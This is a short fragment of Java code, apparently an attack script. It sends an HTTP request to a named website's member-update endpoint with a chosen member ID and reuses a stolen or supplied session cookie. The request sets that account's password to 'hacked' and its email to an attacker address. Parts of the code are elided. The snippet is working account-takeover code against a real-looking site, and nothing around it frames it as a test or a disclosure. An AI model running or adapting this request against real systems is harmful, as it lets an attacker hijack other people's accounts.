...
public class main
{
	public static void main(String[] args) throws Exception {
		...
		con = (HttpURLConnection) new URL("http://dowellcomputer.com/member/memberUpdateAction.jsp?ID=" + memberID + "&memberPassword=hacked&memberNickname=test&memberEmail=hacked@naver.com").openConnection();
		con.setRequestProperty("Cookie", cookie);
